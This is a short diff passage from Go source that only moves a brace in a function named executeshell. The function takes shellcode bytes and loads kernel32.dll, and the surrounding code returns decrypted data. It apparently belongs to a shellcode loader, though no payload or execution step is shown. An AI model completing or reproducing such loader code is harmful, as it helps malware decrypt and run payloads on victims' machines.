@@ -285,8 +285,7 @@ func main() {
 	return decrypted
 }
 
-func executeshell(shellcode[]byte)
-{
+func executeshell(shellcode[]byte) {
 
 k32:= syscall.MustLoadDLL(""kernel32.dll"")
 
